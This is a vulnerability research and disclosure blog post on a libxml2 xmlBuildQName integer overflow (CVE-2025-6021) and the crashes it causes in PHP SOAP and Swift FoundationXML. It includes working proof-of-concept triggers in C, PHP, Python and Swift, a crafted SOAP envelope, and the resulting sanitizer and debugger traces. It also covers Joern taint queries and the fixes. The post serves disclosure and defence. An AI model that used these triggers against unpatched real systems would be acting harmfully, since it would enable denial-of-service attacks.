---
title: "When Native Dependencies Betray: An Integer Overflow in libxml2 with Cross-Language Impact on PHP and Swift"
date: "2026-07-04T10:00:00+00:00"
modified: "2026-07-04T10:00:00+00:00"
slug: "when-native-dependencies-betray-libxml2-integer-overflow"
author: "Ahmed Lekssays"
featured_image: ""
categories: ["Computer Science"]
tags: ["Cyber Security", "Vulnerability Research", "libxml2", "PHP", "Swift", "Static Analysis"]
original_url: ""
excerpt: "A single integer overflow in libxml2's xmlBuildQName() (CVE-2025-6021) cascaded into PHP's SOAP extension (CVE-2025-6491) and Swift's FoundationXML on Linux. This post walks through the root cause, the cross-language crash paths, and the Joern taint analysis used to find them, showing how one flaw in a foundational native library ripples across entire language ecosystems."
---

## Executive Summary

During security research at the Qatar Computing Research Institute, we discovered a critical integer overflow vulnerability in libxml2's `xmlBuildQName()` function ([CVE-2025-6021](https://gitlab.gnome.org/GNOME/libxml2/-/issues/926)) that cascaded into multiple high-profile projects, including PHP's SOAP extension ([CVE-2025-6491](https://github.com/php/php-src/security/advisories/GHSA-453j-q27h-5p8x)) and Swift's FoundationXML library. This research demonstrates how a single flaw in a widely-used native library can create a ripple effect of vulnerabilities across diverse programming language ecosystems. Using static analysis with Joern's taint tracking, we systematically identified vulnerable code paths and developed targeted proofs of concept to demonstrate real-world impact.

## The Root Cause: libxml2's `xmlBuildQName()` Integer Overflow (CVE-2025-6021)

### Understanding the Vulnerability

The vulnerability lives in libxml2's `tree.c`, specifically in `xmlBuildQName()`. This function builds qualified XML names by concatenating a namespace prefix with a local name (`ncname`). The code appeared straightforward:

```c
xmlChar *
xmlBuildQName(const xmlChar *ncname, const xmlChar *prefix,
              xmlChar *memory, int len) {
    int lenn, lenp;
    xmlChar *ret;

    if (ncname == NULL) return(NULL);
    if (prefix == NULL) return((xmlChar *) ncname);

    lenn = strlen((char *) ncname);
    lenp = strlen((char *) prefix);

    if ((memory == NULL) || (len < lenn + lenp + 2)) {
        ret = xmlMalloc(lenn + lenp + 2);
        // ... allocation and concatenation
    } else {
        ret = memory;
    }

    memcpy(ret, prefix, lenp);
    ret[lenp] = ':';
    memcpy(&ret[lenp + 1], ncname, lenn);
    ret[lenn + lenp + 1] = 0;

    return(ret);
}
```

### The Integer Overflow Mechanism

The vulnerability manifests in two critical scenarios.

**Scenario 1: Negative Integer Wraparound**

When `strlen(ncname)` returns a `size_t` value that wraps to a negative value when cast to `int` (e.g., `0xFFFFFFFF` becomes `-1` for a 32-bit signed int), the size check is bypassed:

```c
// If lenn = -1, lenp = 4, len = 100:
// Check: 100 < (-1 + 4 + 2)  ->  100 < 5  ->  FALSE
if ((memory == NULL) || (len < lenn + lenp + 2)) {
    // Bypassed! Uses the stack buffer instead
}
```

The subsequent `memcpy(&ret[lenp + 1], ncname, lenn)` effectively becomes `memcpy(..., ncname, SIZE_MAX)`, attempting to write an enormous amount of data into a small buffer.

**Scenario 2: Integer Overflow in the Sum**

When both `lenn` and `lenp` are large positive integers (each close to `INT_MAX/2`), their sum overflows:

```c
// If lenn = INT_MAX - 10, lenp = 10, len = 100:
// Sum: (INT_MAX - 10) + 10 + 2 = INT_MAX + 2  (overflows to a small value)
if ((memory == NULL) || (len < lenn + lenp + 2)) {
    // Check compares against an overflowed small value -> uses caller buffer
}
```

This causes the function to use the caller-supplied buffer while attempting to write `INT_MAX` bytes into it.

### Proof of Concept for libxml2

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include "libxml/tree.h"
#include "libxml/xmlmemory.h"

int main() {
    const xmlChar *prefix = (const xmlChar *)"1234567890"; // lenp = 10
    size_t lenn_large = (size_t)INT_MAX - 10;

    xmlChar *ncname = (xmlChar *)xmlMalloc(lenn_large + 1);
    if (!ncname) {
        fprintf(stderr, "Allocation failed\n");
        return 1;
    }
    memset(ncname, 'A', lenn_large);
    ncname[lenn_large] = '\0';

    xmlChar buf[100]; // Small stack buffer
    memset(buf, 'B', sizeof(buf));

    // Vulnerable call: triggers integer overflow
    xmlChar *result = xmlBuildQName(ncname, prefix, buf, sizeof(buf));

    if (result == buf) {
        printf("Returned internal buffer: overflow triggered.\n");
    } else if (result) {
        printf("Returned allocated buffer: malloc path taken.\n");
        xmlFree(result);
    }

    xmlFree(ncname);
    xmlCleanupParser();
    return 0;
}
```

**AddressSanitizer output:**

```text
=================================================================
==30429==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffd144e28f4
WRITE of size 2147483637 at 0x7ffd144e28f4 thread T0
    #0 0x7b30e7e3a2c2 in __interceptor_memcpy
    #1 0x7b30e7c7f92f in xmlBuildQName (/lib/x86_64-linux-gnu/libxml2.so.2+0x6192f)
    #2 0x64e6a97014cf in main /home/user/workspace/libxml2/poc_xmlBuildQName.c:24

Address 0x7ffd144e28f4 is located in stack of thread T0 at offset 148 in frame
    #0 0x64e6a97012d8 in main

  This frame has 1 object(s):
    [48, 148) 'buf' (line 20) <== Memory access at offset 148 overflows this variable
=================================================================
```

The ASan output clearly shows an attempted write of 2,147,483,637 bytes (`INT_MAX - 10`) into a 100-byte stack buffer, demonstrating the severity of the integer overflow.

## The Cascade Effect: How One Bug Becomes Many

### PHP SOAP Extension (CVE-2025-6491)

PHP's SOAP extension uses libxml2 for XML processing. The vulnerability surfaces when creating `SoapVar` instances with qualified names derived from untrusted SOAP data.

**Attack vector.** When a SOAP client processes remote service data, an attacker can craft a namespace prefix larger than 2 GB. PHP's SOAP extension passes this directly to libxml2's `xmlBuildQName()`:

```php
<?php
// Oversized qualified-name component (> 2 GB) reaches xmlBuildQName()
$hugeName = str_repeat('A', (2 ** 31) - 10);
$soapVar  = new SoapVar('data', XSD_STRING, $hugeName, 'http://example.com', $hugeName);

$options = [
    'location'   => 'http://127.0.0.1/',
    'uri'        => 'urn:dummy',
    'trace'      => 1,
    'exceptions' => true,
];

$client = new SoapClient(null, $options);
$client->__soapCall("DummyFunction", [$soapVar]);
?>
```

**The crash path.** The GDB trace reveals the exact crash location:

```text
Program received signal SIGSEGV, Segmentation fault.
__GI_strcmp () at ../sysdeps/aarch64/strcmp.S:78

(gdb) bt
#0  __GI_strcmp () at ../sysdeps/aarch64/strcmp.S:78
#1  0x0000aaaaaaf8e72c in serialize_zval (soap.c:4175)
#2  0x0000aaaaaaf8e55c in serialize_parameter (soap.c:4144)
#3  0x0000aaaaaaf8ddc8 in serialize_function_call (soap.c:4005)
#4  0x0000aaaaaaf87794 in do_soap_call (soap.c:2421)
#5  0x0000aaaaaaf88164 in soap_client_call_common (soap.c:2559)
#6  0x0000aaaaaaf88664 in zim_SoapClient___soapCall (soap.c:2651)
```

The crash occurs in `strcmp()` when PHP attempts to serialize the SOAP message. The `xmlBuildQName()` bug left the XML node in an invalid state with a NULL name pointer, leading to a NULL pointer dereference during serialization.

**Valgrind analysis:**

```text
==23007== Invalid read of size 1
==23007==    at 0x488FE8C: strcmp
==23007==    by 0x5F672B: serialize_zval (soap.c:4175)
==23007==  Address 0x0 is not stack'd, malloc'd or (recently) free'd

==23007== Process terminating with default action of signal 11 (SIGSEGV)
==23007==  Access not within mapped region at address 0x0
```

This confirms a NULL pointer dereference: the node's `name` field was left NULL by the failed `xmlBuildQName()` call.

### Swift FoundationXML

Swift's FoundationXML library, which provides XML parsing on Linux, is similarly affected. The vulnerability manifests when parsing a maliciously crafted XML document.

**Attack vector.** First, generate a malicious XML file:

```python
# Generate malicious XML file
INT_MAX = (2 ** 31) - 1
half = INT_MAX // 2

attr_prefix = 'B' * half
attr_name = 'A' * half

with open("malicious.xml", "w", encoding="utf-8") as f:
    f.write(f"<root {attr_prefix}:{attr_name}=\"value\" />")
```

Then parse it from Swift:

```swift
// Vulnerable Swift code
import Foundation
import FoundationXML

let fileURL = URL(fileURLWithPath: "malicious.xml")

do {
    let data = try Data(contentsOf: fileURL)
    let doc = try XMLDocument(data: data, options: [])
    print("Parsed document successfully.")
} catch {
    print("Error parsing XML: \(error)")
}
```

**The crash in `_CFXMLNodeGetPrivateData`:**

```text
==1899621== Invalid read of size 8
==1899621==    at 0x60C3C80: _CFXMLNodeGetPrivateData
                              (in libFoundationXML.so)
==1899621==    by 0x60B6496: $s13FoundationXML7XMLNodeC3ptrACSv_tcfc
==1899621==    by 0x60B05FA: $s13FoundationXML11XMLDocumentC4data7options...
==1899621==  Address 0x0 is not stack'd, malloc'd or (recently) free'd

💣 Program crashed: Bad pointer dereference at 0x0000000000000000

Thread 0 crashed:
0  0x00000000060c3c80  _CFXMLNodeGetPrivateData in libFoundationXML.so
```

When parsing XML with oversized qualified names, `xmlBuildQName()` fails, leaving the `xmlNodePtr->_private` field NULL. FoundationXML's `_CFXMLNodeGetPrivateData()` unconditionally dereferences this pointer, causing an immediate segmentation fault.

## Discovering the Vulnerabilities with Joern

### Why Taint Analysis?

Traditional static analysis tools often struggle with vulnerabilities that span multiple layers of abstraction, particularly when untrusted data flows through native library boundaries. We employed [Joern](https://joern.io/), a code property graph based analysis platform, to perform taint analysis that could track data flow from user-controlled inputs to dangerous sinks.

### The Joern Analysis Approach

**Step 1: Identifying sources.** We first identified all entry points where untrusted data could enter the system:

```scala
// Joern query to find XML parsing entry points
cpg.method.name(".*parse.*|.*Parse.*|.*XML.*")
   .where(_.parameter.name(".*data.*|.*xml.*|.*input.*"))
   .l
```

**Step 2: Tracing data flow.** We then configured taint propagation rules to track how user-supplied strings flow through the codebase:

```scala
// Define taint sources
val sources = cpg.method.name(".*SoapVar.*").parameter.index(4)

// Define dangerous sinks (functions that could cause memory corruption)
val sinks = cpg.method.name("xmlBuildQName|memcpy|strcpy").parameter

// Perform taint analysis
val flows = sinks.reachableByFlows(sources)

flows.foreach { flow =>
  println(s"Taint flow found:")
  flow.elements.foreach { element =>
    println(s"  ${element.file}:${element.lineNumber} - ${element.code}")
  }
}
```

**Step 3: Pattern matching for integer operations.** We specifically looked for patterns where `size_t` values from `strlen()` were cast to `int` and used in arithmetic:

```scala
// Find strlen calls assigned to int variables
cpg.call.name("strlen")
   .inAssignment
   .target
   .filter(_.evalType == "int")
   .l

// Find arithmetic operations involving these variables
cpg.call.name("\\.(plus|minus)")
   .where(_.argument.code("lenn|lenp"))
   .l
```

**Step 4: Sink analysis.** Finally, we identified vulnerable memory operations:

```scala
// Find memcpy calls where size comes from tainted integer arithmetic
cpg.call.name("memcpy")
   .where(_.argument.order(3)  // size parameter
     .reachableBy(cpg.identifier.name("lenn|lenp")))
   .l
```

### Key Findings from Joern Analysis

The taint analysis revealed several critical insights:

- **Cross-language boundary issues.** Taint tracking showed that high-level languages (PHP, Swift) passed user-controlled strings directly to C functions without size validation.
- **Type conversion vulnerabilities.** We identified 15+ locations where `size_t` was implicitly or explicitly cast to `int` without overflow checks.
- **Amplification effect.** A single input could trigger multiple overflow conditions due to string concatenation in qualified name handling.

## The Fix: Proper Integer Overflow Prevention

### libxml2 Fix

The libxml2 maintainers implemented a straightforward but effective fix:

```c
xmlChar *
xmlBuildQName(const xmlChar *ncname, const xmlChar *prefix,
              xmlChar *memory, int len) {
    size_t lenn, lenp;  // Changed from int to size_t
    xmlChar *ret;

    if (ncname == NULL) return(NULL);
    if (prefix == NULL) return((xmlChar *) ncname);

    lenn = strlen((char *) ncname);
    lenp = strlen((char *) prefix);

    // Add overflow check before arithmetic
    if (lenn >= SIZE_MAX - lenp - 1)
        return(NULL);

    if ((memory == NULL) || (len < lenn + lenp + 2)) {
        ret = xmlMalloc(lenn + lenp + 2);
        // ... rest of implementation
    }
    // ... rest of function
}
```

Key changes:

- Changed `lenn` and `lenp` from `int` to `size_t` to match `strlen()`'s return type.
- Added an explicit overflow check: `if (lenn >= SIZE_MAX - lenp - 1) return(NULL);`.
- This prevents the sum from overflowing, since the maximum theoretical `strlen` value is `SIZE_MAX - 1`.

### PHP SOAP Extension Fix

PHP needed to add validation before passing data to libxml2. The fix adds a NULL pointer check:

```c
// In ext/soap/soap.c, serialize_zval function (line 4175)

// Before fix:
if (!strcmp((char*)xmlParam->name, "BOGUS")) {
    xmlNodeSetName(xmlParam, BAD_CAST(paramName));
}

// After fix (commit 0298837):
if (xmlParam->name == NULL || strcmp((char*)xmlParam->name, "BOGUS") == 0) {
    xmlNodeSetName(xmlParam, BAD_CAST(paramName));
}
```

This defensive check prevents the NULL pointer dereference when `xmlBuildQName()` fails and leaves the node name as NULL. Additionally, PHP now validates input sizes:

```c
// Additional validation in SOAP var creation
if (strlen(prefix) > INT_MAX - strlen(localname) - 2) {
    php_error_docref(NULL, E_WARNING,
        "Qualified name too long");
    RETURN_NULL();
}
```

## Impact and Scope

### Affected Software Ecosystems

**PHP (CVE-2025-6491)**

- All PHP versions <= 8.5.0-dev with libxml2 < 2.13.
- Patched in 8.1.33, 8.2.29, 8.3.23, and 8.4.10.
- Attack vector: remote SOAP services, web applications.

**Swift FoundationXML**

- Swift 6.1.1 and earlier on Linux.
- Attack vector: malicious XML documents.

**Other projects**

- Any software using libxml2 < 2.13 and calling `xmlBuildQName()` with user input.
- Includes custom XML parsers, document processors, and web browsers.

### Real-World Attack Scenarios

**Scenario 1: SOAP API server.** A public-facing SOAP API server accepts client requests. An attacker crafts a malicious SOAP envelope:

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:AAAA...AAAA="http://example.com">
  <soap:Body>
    <AAAA...AAAA:MaliciousElement>data</AAAA...AAAA:MaliciousElement>
  </soap:Body>
</soap:Envelope>
```

Where `AAAA...AAAA` is 2 GB+ characters. The server crashes, causing denial of service.

**Scenario 2: Swift document parser.** A Swift application on Linux processes user-uploaded XML documents for data import. An attacker uploads a crafted XML file with oversized qualified names, crashing the application and potentially corrupting data.

## Lessons Learned

### 1. Trust Boundaries in Native Dependencies

High-level languages often place implicit trust in native libraries. When PHP or Swift passes a string to libxml2, they assume the library will handle edge cases safely. This research shows otherwise:

- **Never trust implicit conversions.** `size_t` to `int` conversions are dangerous.
- **Validate at boundaries.** Even when using trusted libraries, validate data at the interface.
- **Defense in depth.** Both the library and its users should implement safety checks.

### 2. The Power of Taint Analysis

Traditional fuzzing might have taken months to discover these vulnerabilities because of the specific conditions required (2 GB+ strings). Joern's taint analysis allowed us to:

- Systematically map data flows from untrusted sources to dangerous sinks.
- Identify type conversion issues across language boundaries.
- Find similar patterns in related codebases.

### 3. Cascading Vulnerabilities

A single vulnerability in a foundational library can affect dozens of projects across multiple programming languages. The security community must:

- Monitor dependencies more carefully.
- Implement automated scanning for known vulnerable patterns.
- Share vulnerability information across language ecosystems.

### 4. Integer Arithmetic Remains Dangerous

Despite decades of awareness, integer overflow vulnerabilities persist. Modern development should:

- Use safe arithmetic (e.g., Rust's checked arithmetic, `__builtin_add_overflow` in C).
- Enable compiler warnings such as `-Wshorten-64-to-32` and `-Wint-conversion`.
- Employ static analysis tools in CI/CD pipelines.

## Conclusion

The discovery of CVE-2025-6021 and CVE-2025-6491 illustrates how critical vulnerabilities can hide in foundational libraries and affect entire ecosystems. Through systematic taint analysis with Joern, we identified a single integer overflow bug that cascaded into denial-of-service vulnerabilities across PHP, Swift, and potentially dozens of other projects.

This research underscores the importance of rigorous input validation at trust boundaries, safe integer arithmetic practices, advanced static analysis in security research, and collaborative disclosure across language communities. As our software stacks grow more complex, with layers of abstraction spanning multiple languages and libraries, the need for systematic security analysis becomes ever more critical. Tools like Joern let researchers peer through these layers and find vulnerabilities that traditional methods might miss.

## References

- CVE-2025-6021: [https://gitlab.gnome.org/GNOME/libxml2/-/issues/926](https://gitlab.gnome.org/GNOME/libxml2/-/issues/926)
- CVE-2025-6491: [https://github.com/php/php-src/security/advisories/GHSA-453j-q27h-5p8x](https://github.com/php/php-src/security/advisories/GHSA-453j-q27h-5p8x)
- PHP fix commit: [https://github.com/php/php-src/commit/0298837252fda06e0f86be3dfe91f166f45e85d4](https://github.com/php/php-src/commit/0298837252fda06e0f86be3dfe91f166f45e85d4)
- libxml2 fix: [https://gitlab.gnome.org/GNOME/libxml2/-/merge_requests/314](https://gitlab.gnome.org/GNOME/libxml2/-/merge_requests/314)

### Disclosure Timeline

- **May 27, 2025:** libxml2 vulnerability reported.
- **May 28, 2025:** libxml2 vulnerability fixed.
- **May 29, 2025:** initial Swift vulnerability report.
- **May 31, 2025:** PHP vulnerabilities reported.
- **July 3, 2025:** public disclosure and CVE assignment for PHP.
- **Fixes released:** libxml2 2.13+, PHP 8.1.33+, 8.2.29+, 8.3.23+, 8.4.10+.
